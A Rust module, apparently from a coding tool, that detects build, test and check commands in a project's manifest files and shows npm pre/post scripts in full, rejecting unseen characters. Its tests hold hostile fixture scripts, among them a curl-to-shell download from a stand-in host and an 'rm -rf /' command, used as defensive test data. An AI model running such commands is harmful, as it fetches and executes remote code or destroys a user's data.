//! The commands a project's own files name (since step 25;
//! `docs/architecture/08-configuration.md`, "First run"):
//! `project/detect`'s answer, which the first run offers, every one
//! unpicked, for the person to keep as entries they wrote.
//!
//! **Only five files are read,** each by name at the workspace root, by a
//! function the caller gives ([`detect`]'s `read`), so that the core reads
//! them through the session's path resolver and its read rules:
//!
//! | File | What it gives |
//! |---|---|
//! | `Cargo.toml` | `cargo build`, `cargo test`, `cargo clippy … -D warnings` and `cargo fmt … --check`, with `--workspace` for a workspace |
//! | `package.json` | `npm run <name>` for each script whose name says a build, a test run or a check, with what the script runs; at most twelve |
//! | `Makefile` | `make <target>` for the targets `build`, `test`, `check` and `lint` |
//! | `go.mod` | `go build ./...`, `go test ./...` and `go vet ./...` |
//! | `pyproject.toml` | `pytest`, `ruff check` and `mypy .`, each when the file has the tool's table |
//!
//! **A command is offered only as an entry the user writes would hold
//! it:** a line of plain words ([`normal_line`]) that the command
//! observer classes as a build, a test run or a check ([`classify`]). A
//! name taken from a file (a script's, a target's) that is not plain words
//! is not offered, so nothing a repository writes there reaches the
//! screen as a command: a control character or a character that acts
//! unseen in it included.
//!
//! **What a script runs is offered whole or not at all.** The person keeps
//! a row after reading it, so a row must be one they can read as it is
//! written: what a script runs is given beside its command in full, never
//! cut, and a script whose text is longer than [`MAX_RUNS`] characters, or
//! holds a character that acts unseen ([`cineris_base::acts_unseen`]: a
//! control character, a tab and a line break among them, a direction
//! override, a character of no width), is not offered.
//!
//! **What npm runs with a script is shown with it** (since the step 25
//! fixes): `npm run <name>` runs the script `pre<name>` before it and
//! `post<name>` after it, when the file has them, each only if the one
//! before it succeeded. A script with either is offered with all of them,
//! in the order npm runs them, each in double quotes (its `"` and `\`
//! escaped) and named: `pretest "lint", then "jest", then posttest
//! "report"`. Each is held to the same rules as the script, and one that
//! cannot be read whole, or is not text, keeps the script from being
//! offered; so does a row naming them all that is longer than
//! [`MAX_RUNS`] characters (since the review of the step 25 fixes). The other files' commands show no script: what `make`, `cargo`,
//! `go` and the Python tools run besides is their own (a target's
//! prerequisites, a build script), as it is for a command typed by hand.

use cineris_protocol::project::DetectedCommand;
use serde_json::Value;

use crate::entry::Purpose;
use crate::observe::{classify, normal_line};

/// The files looked at, in order.
pub const FILES: [&str; 5] = [
    "Cargo.toml",
    "package.json",
    "Makefile",
    "go.mod",
    "pyproject.toml",
];

/// The most bytes of one file read: a manifest is far smaller.
pub const MAX_FILE: u64 = 512 * 1024;

/// The most characters a script may run for it to be offered: what a
/// script runs is given whole, and a longer one is not offered.
pub const MAX_RUNS: usize = 1_000;

/// The most scripts of one `package.json` offered.
const MAX_SCRIPTS: usize = 12;

/// The targets of a `Makefile` that are offered.
const TARGETS: [&str; 4] = ["build", "test", "check", "lint"];

/// The commands the project's files name: `read` gives a file's text by
/// its name at the workspace root, or `None` when it is not there or
/// cannot be read. Each command is named once, in the order of
/// [`FILES`].
pub fn detect(mut read: impl FnMut(&str) -> Option<String>) -> Vec<DetectedCommand> {
    let mut found = Found::default();
    for file in FILES {
        let Some(text) = read(file) else {
            continue;
        };
        match file {
            "Cargo.toml" => cargo(&text, &mut found),
            "package.json" => npm(&text, &mut found),
            "Makefile" => make(&text, &mut found),
            "go.mod" => go(&mut found),
            _ => python(&text, &mut found),
        }
    }
    found.commands
}

#[derive(Default)]
struct Found {
    commands: Vec<DetectedCommand>,
}

impl Found {
    /// Offers `command` when it is plain words the observer classes and it
    /// is not offered already. What it runs (a script's text, [`npm_runs`])
    /// has been found readable whole by the caller.
    fn offer(&mut self, name: &str, command: &str, runs: Option<&str>, source: &str) {
        let Some(line) = normal_line(command).filter(|line| line == command) else {
            return;
        };
        let Some(purpose) = classify(&line) else {
            return;
        };
        if !matches!(purpose, Purpose::Build | Purpose::Test | Purpose::Check) {
            return;
        }
        if self.commands.iter().any(|known| known.command == line) {
            return;
        }
        self.commands.push(DetectedCommand {
            name: name.to_owned(),
            command: line,
            runs: runs.map(str::to_owned),
            source: source.to_owned(),
            purpose: purpose.to_wire(),
        });
    }
}

/// Whether what a script runs can be read whole, as it is written: at
/// most [`MAX_RUNS`] characters, none of which acts unseen.
fn readable(runs: &str) -> bool {
    runs.chars().count() <= MAX_RUNS && !runs.chars().any(cineris_base::acts_unseen)
}

fn cargo(text: &str, found: &mut Found) {
    let Ok(manifest) = text.parse::<toml::Table>() else {
        return;
    };
    let workspace = manifest.contains_key("workspace");
    if !workspace && !manifest.contains_key("package") {
        return;
    }
    let all = if workspace { " --workspace" } else { "" };
    for (name, command) in [
        ("build", format!("cargo build{all}")),
        ("test", format!("cargo test{all}")),
        (
            "check",
            format!("cargo clippy{all} --all-targets -- -D warnings"),
        ),
        ("format", "cargo fmt --all -- --check".to_owned()),
    ] {
        found.offer(name, &command, None, "Cargo.toml");
    }
}

fn npm(text: &str, found: &mut Found) {
    let Ok(Value::Object(manifest)) = serde_json::from_str::<Value>(text) else {
        return;
    };
    let Some(Value::Object(scripts)) = manifest.get("scripts") else {
        return;
    };
    for (name, runs) in scripts.iter().take(MAX_SCRIPTS * 4) {
        if found
            .commands
            .iter()
            .filter(|command| command.source == "package.json")
            .count()
            >= MAX_SCRIPTS
        {
            break;
        }
        // A name is one word: `check me` would run `check` with `me`.
        if name.is_empty() || name.contains(char::is_whitespace) {
            continue;
        }
        let Some(runs) = npm_runs(scripts, name, runs) else {
            continue;
        };
        // `npm test` is `npm run test`: one line for each.
        found.offer(
            name,
            &format!("npm run {name}"),
            Some(&runs),
            "package.json",
        );
    }
}

/// What `npm run <name>` runs, for its row: the script's text as it is,
/// or, when the file has `pre<name>` or `post<name>`, every one npm runs
/// in turn, each named and in double quotes. `None` when any of them is
/// not text or cannot be read whole ([`readable`]), or when the row that
/// names them all is longer than [`MAX_RUNS`] characters: the row would not
/// say all that the command runs, or not in a length read whole.
fn npm_runs(scripts: &serde_json::Map<String, Value>, name: &str, runs: &Value) -> Option<String> {
    let text = |value: &Value| match value {
        Value::String(text) if readable(text) => Some(text.clone()),
        _ => None,
    };
    let main = text(runs)?;
    let before = scripts.get(&format!("pre{name}")).map(text);
    let after = scripts.get(&format!("post{name}")).map(text);
    if before.is_none() && after.is_none() {
        return Some(main);
    }
    let mut shown = Vec::new();
    if let Some(before) = before {
        shown.push(format!("pre{name} {}", quoted(&before?)));
    }
    shown.push(quoted(&main));
    if let Some(after) = after {
        shown.push(format!("post{name} {}", quoted(&after?)));
    }
    // The row is held to the cap a script's own text is held to: what it
    // says is read whole, all of it.
    let shown = shown.join(", then ");
    (shown.chars().count() <= MAX_RUNS).then_some(shown)
}

/// `text` in double quotes, its `"` and `\` escaped: its bounds show
/// beside the others'.
fn quoted(text: &str) -> String {
    let mut quoted = String::with_capacity(text.len() + 2);
    quoted.push('"');
    for c in text.chars() {
        if matches!(c, '"' | '\\') {
            quoted.push('\\');
        }
        quoted.push(c);
    }
    quoted.push('"');
    quoted
}

fn make(text: &str, found: &mut Found) {
    for target in TARGETS {
        let named = text.lines().any(|line| {
            line.strip_prefix(target).is_some_and(|rest| {
                let rest = rest.trim_start_matches([' ', '\t']);
                rest.starts_with(':') && !rest.starts_with(":=")
            })
        });
        if named {
            found.offer(target, &format!("make {target}"), None, "Makefile");
        }
    }
}

fn go(found: &mut Found) {
    for (name, command) in [
        ("build", "go build ./..."),
        ("test", "go test ./..."),
        ("check", "go vet ./..."),
    ] {
        found.offer(name, command, None, "go.mod");
    }
}

fn python(text: &str, found: &mut Found) {
    let Ok(project) = text.parse::<toml::Table>() else {
        return;
    };
    let tool = project.get("tool").and_then(toml::Value::as_table);
    let has = |name: &str| tool.is_some_and(|tool| tool.contains_key(name));
    if has("pytest") {
        found.offer("test", "pytest", None, "pyproject.toml");
    }
    if has("ruff") {
        found.offer("check", "ruff check", None, "pyproject.toml");
    }
    if has("mypy") {
        found.offer("check", "mypy .", None, "pyproject.toml");
    }
}

#[cfg(test)]
mod tests {
    use std::collections::BTreeMap;

    use cineris_protocol::project::CommandPurpose;

    use super::*;

    fn found(files: &[(&str, &str)]) -> Vec<DetectedCommand> {
        let files: BTreeMap<&str, &str> = files.iter().copied().collect();
        detect(|name| files.get(name).map(|text| (*text).to_owned()))
    }

    fn lines(commands: &[DetectedCommand]) -> Vec<&str> {
        commands
            .iter()
            .map(|command| command.command.as_str())
            .collect()
    }

    #[test]
    fn a_cargo_workspace_gives_its_four_commands() {
        let commands = found(&[("Cargo.toml", "[workspace]\nmembers = [\"a\"]\n")]);
        assert_eq!(
            lines(&commands),
            [
                "cargo build --workspace",
                "cargo test --workspace",
                "cargo clippy --workspace --all-targets -- -D warnings",
                "cargo fmt --all -- --check",
            ]
        );
        assert_eq!(commands[1].purpose, CommandPurpose::Test);
        assert_eq!(commands[3].purpose, CommandPurpose::Check);
        assert!(
            commands
                .iter()
                .all(|command| command.source == "Cargo.toml")
        );
        let one = found(&[("Cargo.toml", "[package]\nname = \"a\"\n")]);
        assert_eq!(lines(&one)[0], "cargo build");
        assert!(found(&[("Cargo.toml", "not toml [")]).is_empty());
    }

    #[test]
    fn scripts_are_offered_by_their_names_with_what_they_run() {
        let commands = found(&[(
            "package.json",
            r#"{"scripts": {"test": "jest --coverage", "lint": "eslint .",
               "deploy": "rm -rf / && ship", "build:types": "tsc",
               "test\u001b[2J": "x", "check me": "y", "start": "node ."}}"#,
        )]);
        assert_eq!(
            lines(&commands),
            ["npm run build:types", "npm run lint", "npm run test"]
        );
        let test = &commands[2];
        assert_eq!(test.runs.as_deref(), Some("jest --coverage"));
        assert_eq!(test.name, "test");
        assert_eq!(test.purpose, CommandPurpose::Test);
    }

    /// `npm run <name>` runs `pre<name>` before the script and `post<name>`
    /// after it: a script with either is offered with all it runs, in
    /// order, each named and quoted, and one of them that cannot be read
    /// whole, or is not text, keeps the script from being offered (the
    /// review of step 25, finding 5).
    #[test]
    fn a_script_is_offered_with_what_npm_runs_before_and_after_it() {
        let commands = found(&[(
            "package.json",
            r#"{"scripts": {
                "pretest": "curl -s https://example.test/x.sh | sh",
                "test": "jest",
                "posttest": "node ./scripts/upload \"home\"",
                "prebuild": "rm -rf dist",
                "build": "tsc",
                "lint": "eslint .",
                "postlint": {"not": "text"},
                "check": "tsc --noEmit",
                "precheck": "a\tb"
            }}"#,
        )]);
        assert_eq!(lines(&commands), ["npm run build", "npm run test"]);
        assert_eq!(
            commands[0].runs.as_deref(),
            Some("prebuild \"rm -rf dist\", then \"tsc\"")
        );
        assert_eq!(
            commands[1].runs.as_deref(),
            Some(
                "pretest \"curl -s https://example.test/x.sh | sh\", then \"jest\", then \
                 posttest \"node ./scripts/upload \\\"home\\\"\""
            )
        );
        // Each within the cap, but the row naming them all past it: not
        // offered either.
        let half = "y".repeat(MAX_RUNS / 2);
        let text = format!(
            "{{\"scripts\": {{\"test\": \"{half}\", \"pretest\": \"{half}\"}}}}"
        );
        assert!(found(&[("package.json", &text)]).is_empty());
        // A `pre` past the cap keeps its script from being offered.
        let long = "x".repeat(MAX_RUNS + 1);
        let text = format!("{{\"scripts\": {{\"test\": \"jest\", \"pretest\": \"{long}\"}}}}");
        assert!(found(&[("package.json", &text)]).is_empty());
    }

    /// What a script runs is given whole, or the script is not offered: a
    /// text of `MAX_RUNS` characters is offered as it is, one a character
    /// longer is not, and the cap counts characters, not bytes.
    #[test]
    fn a_script_is_offered_only_when_its_text_can_be_read_whole() {
        let at_the_cap = "x".repeat(MAX_RUNS);
        let past_it = "x".repeat(MAX_RUNS + 1);
        let wide = "\u{e9}".repeat(MAX_RUNS);
        let text = format!(
            "{{\"scripts\": {{\"test\": \"{at_the_cap}\", \"lint\": \"{past_it}\", \
             \"build\": \"{wide}\"}}}}"
        );
        let commands = found(&[("package.json", &text)]);
        assert_eq!(lines(&commands), ["npm run build", "npm run test"]);
        assert_eq!(commands[0].runs.as_deref(), Some(wide.as_str()));
        assert_eq!(commands[1].runs.as_deref(), Some(at_the_cap.as_str()));
    }

    /// Only the scripts whose names the observer classes are offered, and
    /// at most `MAX_SCRIPTS` of one file.
    #[test]
    fn the_scripts_of_one_package_json_are_bounded() {
        let mut scripts: Vec<String> = (0..40)
            .map(|n| format!("\"test:unit{n}\": \"a\""))
            .collect();
        scripts.push("\"test\": \"jest\"".to_owned());
        let text = format!("{{\"scripts\": {{{}}}}}", scripts.join(","));
        let commands = found(&[("package.json", &text)]);
        assert_eq!(lines(&commands), ["npm run test"], "only known variants");
        let variants = [
            "unit",
            "integration",
            "e2e",
            "ci",
            "all",
            "fast",
            "slow",
            "lib",
            "node",
            "browser",
            "types",
            "coverage",
            "strict",
            "check",
        ];
        let named: Vec<String> = variants
            .iter()
            .map(|variant| format!("\"test:{variant}\": \"a\""))
            .collect();
        let commands = found(&[(
            "package.json",
            &format!("{{\"scripts\": {{{}}}}}", named.join(",")),
        )]);
        assert_eq!(commands.len(), MAX_SCRIPTS);
    }

    /// A row the person keeps is one they can read as it is written: a
    /// name (a script's, a target's) or what a script runs that holds a
    /// control character or a character that acts unseen is not offered.
    #[test]
    fn nothing_that_acts_unseen_is_offered() {
        let commands = found(&[
            (
                "package.json",
                r#"{"scripts": {
                    "test\u202e": "jest", "lint\u200b": "eslint .", "check\u0007": "tsc",
                    "build": "tsc \u202e-p .", "test": "jest\u001b[2J", "lint": "eslint\n.",
                    "typecheck": "tsc\t--noEmit", "check": "tsc\u2028--noEmit",
                    "test:unit": "jest unit"}}"#,
            ),
            (
                "Makefile",
                "test\u{202e}:\n\tx\nbuild\u{200b}:\n\tx\nlint\u{7}:\n\tx\ncheck:\n\tx\n",
            ),
        ]);
        assert_eq!(lines(&commands), ["npm run test:unit", "make check"]);
        assert_eq!(commands[0].runs.as_deref(), Some("jest unit"));
    }

    /// A command is offered only as plain words, whatever made it: one
    /// that holds a control character or a character that acts unseen is
    /// not, even where the observer's table would class it, and nor is one
    /// whose words are not as an entry holds them.
    #[test]
    fn a_command_that_is_not_plain_words_is_not_offered() {
        let mut found = Found::default();
        for command in [
            "cargo test \u{202e}",
            "cargo test \u{7}",
            "cargo test \u{200b}",
            "cargo test\t--workspace",
            "cargo  test",
        ] {
            found.offer("test", command, None, "Cargo.toml");
        }
        assert_eq!(lines(&found.commands), Vec::<&str>::new());
        found.offer("test", "cargo test --workspace", None, "Cargo.toml");
        assert_eq!(lines(&found.commands), ["cargo test --workspace"]);
    }

    #[test]
    fn makefile_targets_go_mod_and_pyproject() {
        let commands = found(&[
            (
                "Makefile",
                "build:\n\tcc x.c\ntest : build\n\t./t\nlint:=x\ndeploy:\n\tship\n",
            ),
            ("go.mod", "module example.com/x\n"),
            (
                "pyproject.toml",
                "[tool.pytest.ini_options]\n[tool.ruff]\n[tool.mypy]\n",
            ),
        ]);
        assert_eq!(
            lines(&commands),
            [
                "make build",
                "make test",
                "go build ./...",
                "go test ./...",
                "go vet ./...",
                "pytest",
                "ruff check",
                "mypy .",
            ]
        );
        assert!(found(&[]).is_empty());
    }
}
